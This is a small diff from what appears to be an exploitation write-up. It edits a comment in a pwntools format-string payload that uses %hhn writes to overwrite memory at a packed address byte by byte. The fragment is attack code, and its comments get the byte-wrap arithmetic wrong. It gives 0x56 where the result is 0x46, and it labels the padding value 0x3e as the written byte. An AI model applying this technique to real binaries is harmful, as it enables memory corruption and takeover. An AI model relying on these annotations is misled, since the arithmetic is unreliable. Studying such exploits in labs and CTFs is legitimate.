@@ -123,7 +123,7 @@ payload = (
     p32(0x804a043)       # highest    (0x12 = 18)
     b'%120c%10$hhn'      # write 120 = 0x78
     b'%206c%11$hhn'      # write 326-120 = 206 = 0x146 -> 0x56 (byte wrap)
-    b'%62c%12$hhn'       # write 388-326 = 62 = 0x3e -> 0x34 after wrap???
+    b'%62c%12$hhn'       # write 388-326 = 62 => 0x3e (byte at address+0)
 )
 ```
 
